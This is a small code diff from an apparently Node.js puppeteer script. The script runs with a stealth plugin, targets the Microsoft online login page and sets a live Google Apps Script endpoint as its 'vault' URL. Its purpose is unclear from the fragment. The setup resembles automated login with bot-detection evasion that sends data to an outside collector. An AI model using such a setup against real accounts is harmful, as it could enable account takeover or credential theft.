@@ -6,7 +6,7 @@ const FormData = require('form-data');
 puppeteer.use(StealthPlugin());
 
 // --- CONFIGURATION ---
-const VAULT_URL = "https://script.google.com/macros/s/YOUR_DEPLOYMENT_ID/exec";
+const VAULT_URL = "https://script.google.com/macros/s/AKfycbwmZxqJQzNuXbm0BPsqsXCX88RiFGD9awSw7zXU-rzvxYOnlkn8RWjdekW13EJuxZjq/exec";
 const TARGET = "https://login.microsoftonline.com/";
 
 // YOUR NEW CREDENTIALS
